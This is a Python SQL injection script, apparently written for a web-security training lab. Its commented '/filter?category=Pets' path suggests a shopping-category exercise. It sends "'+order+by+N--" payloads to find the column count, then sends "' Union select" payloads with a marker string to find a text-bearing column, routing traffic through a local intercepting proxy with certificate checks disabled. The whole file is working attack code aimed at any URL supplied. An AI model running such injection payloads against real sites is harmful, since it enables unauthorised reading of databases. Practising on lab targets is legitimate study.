import requests
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def exploit_sqli(url):
    # path = '/filter?category=Pets'
    for i in range(1,50):
        payload = "'+order+by+%s--" %i
        # r = requests.get(url+path+payload, verify=False, proxies=proxies)
        r = requests.get(url+payload, verify=False, proxies=proxies)
        if "Internal Server Error" in r.text:
            return i-1  
    return False

def exploit_sqli_string_field(url,num_cols):
    # path = '/filter?category=Pets'
    for i in range(1,num_cols+1):
        string = "'ClwwFR'"
        payload_list = ['null'] * num_cols
        payload_list[i-1] = string
        sql_payload = "' Union select "+ ','.join(payload_list) + "--"
        # r= requests.get(url + path +sql_payload, verify=False, proxies=proxies)
        r= requests.get(url + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if string.strip('\'') in res:
            return i
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-]Usages: %s <url> <payload>" % sys.argv[0])
        print("[-]Example: %s www.example.com '1=1'" % sys.argv[0])
        sys.exit(-1)
    

    print("[+] Finding the number of column......")
    num_cols = exploit_sqli(url)
    if num_cols:
        print("[+] The number of column is " + str(num_cols) + "." )
        print("[+] Figuring out which column contains text......")
        string_column = exploit_sqli_string_field(url,num_cols)
        if string_column:
            print("[+] The column that contains text is " + str(string_column))
        else:
            print("[+] We were not able to find a column that has a string data type.")
    else:
        print("[+] Exploit Unsuccessful")